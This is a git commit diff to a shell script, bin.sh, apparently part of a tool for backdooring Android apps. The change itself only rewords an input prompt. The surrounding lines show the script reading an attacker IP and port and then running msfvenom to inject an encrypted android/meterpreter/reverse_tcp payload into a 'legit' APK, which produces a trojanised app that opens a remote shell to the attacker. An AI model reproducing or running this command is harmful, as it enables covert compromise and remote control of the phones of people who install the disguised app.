d73c9939a3699dc6347e7b867c29b23b6e5c3a54
Rishav Verma <102639409+official-exploiterarmy@users.noreply.github.com>
2022-07-04 15:11:31 +0530

    Update bin.sh

--- bin.sh
+++ bin.sh
@@ -8,7 +8,7 @@ echo -n "Enter Your IP: "
 read IP
 echo -n "Enter PORT No: "
 read PORT 
-echo -n "Enter The Name Of Your Legit apk: "
+echo -n "Enter The path Of Your Legit apk: "
 read path 
 
 xterm -e msfvenom -x $path -p android/meterpreter/reverse_tcp --encrypt=base64 LHOST=$IP LPORT=$PORT -o $PAYLOAD.apk
